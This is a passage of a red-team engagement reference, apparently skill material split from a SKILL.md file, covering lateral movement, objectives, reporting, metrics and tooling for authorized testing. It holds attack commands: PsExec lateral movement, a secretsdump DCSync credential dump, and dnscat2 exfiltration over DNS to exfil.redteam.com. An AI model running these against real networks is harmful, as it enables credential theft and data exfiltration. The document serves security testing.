# conducting-full-scope-red-team-engagement — 详细参考（由 SKILL.md 拆分）

# Lateral movement via PsExec (T1021.002)
psexec.py domain/admin:password@fileserver.target.com
```

### Phase 5: Objective Achievement

Define and pursue specific objectives:

1. **Domain Dominance**: Achieve Domain Admin access and DCSync credentials
2. **Data Exfiltration**: Locate and exfiltrate crown jewel data (e.g., PII, financial records)
3. **Business Impact Simulation**: Demonstrate ransomware deployment capability (without execution)
4. **Physical Access**: Badge cloning, tailgating, server room access

```bash
# DCSync attack (T1003.006)
secretsdump.py domain/admin:password@dc01.target.com -just-dc-ntlm

# Exfiltration over DNS (T1048.003)
dnscat2 --dns "domain=exfil.redteam.com" --secret=s3cr3t
```

### Phase 6: Reporting and Debrief

The report should include:

1. **Executive Summary**: Business impact, risk rating, key findings
2. **Attack Narrative**: Timeline of activities with screenshots and evidence
3. **MITRE ATT&CK Mapping**: Full heat map of techniques used
4. **Findings**: Each finding with CVSS score, evidence, remediation
5. **Detection Gap Analysis**: What the SOC detected vs. what was missed
6. **Purple Team Recommendations**: Specific detection rules for gaps identified

## Metrics and KPIs

| Metric | Description |
|---|---|
| Mean Time to Detect (MTTD) | Average time from action to SOC detection |
| Mean Time to Respond (MTTR) | Average time from detection to containment |
| TTP Coverage | Percentage of executed techniques detected |
| Objective Achievement Rate | Percentage of defined objectives completed |
| Dwell Time | Total time red team maintained access undetected |

## Tools and Frameworks

- **C2 Frameworks**: Havoc, Cobalt Strike, Sliver, Mythic, Brute Ratel C4
- **Reconnaissance**: Amass, Recon-ng, theHarvester, SpiderFoot
- **Exploitation**: Metasploit, Impacket, CrackMapExec, Rubeus
- **Post-Exploitation**: Mimikatz, SharpCollection, BOF.NET
- **Reporting**: PlexTrac, Ghostwriter, Serpico

## References

- MITRE ATT&CK Framework: https://attack.mitre.org/
- Red Team Guide: https://redteam.guide/
- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
- TIBER-EU Framework for Red Teaming: https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/
- CBEST Intelligence-Led Testing: https://www.bankofengland.co.uk/financial-stability/financial-sector-continuity
